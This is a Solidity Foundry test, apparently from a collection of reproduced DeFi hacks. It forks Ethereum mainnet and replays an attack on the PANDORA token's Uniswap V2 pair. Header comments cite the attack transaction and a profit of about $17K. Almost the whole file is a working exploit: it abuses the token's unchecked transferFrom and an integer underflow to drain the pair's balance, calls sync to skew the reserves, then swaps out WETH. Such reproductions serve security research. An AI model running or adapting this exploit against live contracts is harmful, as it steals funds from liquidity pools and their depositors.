// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// TX : https://phalcon.blocksec.com/explorer/tx/eth/0x7c5a909b45014e35ddb89697f6be38d08eff30e7c3d3d553033a6efc3b444fdd
// GUY : https://twitter.com/pennysplayer/status/1766479470058406174
// Profit : ~17K USD
// REASON : integer underflow

interface NoReturnTransferFrom  {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external;
}

contract ContractTest is Test {
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    NoReturnTransferFrom constant PANDORA = NoReturnTransferFrom(0xddaDF1bf44363D07E750C20219C2347Ed7D826b9);
    Uni_Pair_V2 V2_PAIR = Uni_Pair_V2(0x89CB997C36776D910Cfba8948Ce38613636CBc3c);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() external {
        cheats.createSelectFork("mainnet", 19184577);
        // deal(address(WETH), address(this), 0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] Attacker WETH before exploit", WETH.balanceOf(address(this)), 18);
        uint256 pandora_balance = PANDORA.balanceOf(address(V2_PAIR));
        PANDORA.transferFrom(address(V2_PAIR),address(PANDORA),pandora_balance - 1);
        V2_PAIR.sync();
        (uint256 ethReserve,uint256 oldPANDORAReserve,) = V2_PAIR.getReserves();
        PANDORA.transferFrom(address(PANDORA),address(V2_PAIR),pandora_balance - 1);
        uint256 newPANDORAReserve = PANDORA.balanceOf(address(V2_PAIR));
        uint256 amountin = newPANDORAReserve - oldPANDORAReserve;
        uint256 swapAmount = amountin * 9975 * ethReserve / (oldPANDORAReserve * 10_000 + amountin * 9975);

        //swap PANDORA to WBNB
        V2_PAIR.swap(swapAmount,0, address(this), "");
        emit log_named_decimal_uint("[End] Attacker WETH after exploit", WETH.balanceOf(address(this)), 18);
    }


}
